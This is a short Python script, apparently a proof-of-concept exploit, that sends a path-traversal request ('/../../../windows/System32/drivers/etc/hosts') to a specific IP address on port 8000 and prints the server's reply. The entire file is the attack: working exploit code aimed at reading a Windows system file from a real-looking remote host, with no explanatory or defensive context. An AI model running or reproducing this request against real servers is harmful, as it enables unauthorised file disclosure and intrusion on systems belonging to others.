import http.client

host = '222.184.87.187:8000'
conn = http.client.HTTPConnection(host, timeout=20)
conn.request('GET', '/../../../../../../../../windows/System32/drivers/etc/hosts')
html_doc = conn.getresponse().read().decode('utf8')
print(html_doc)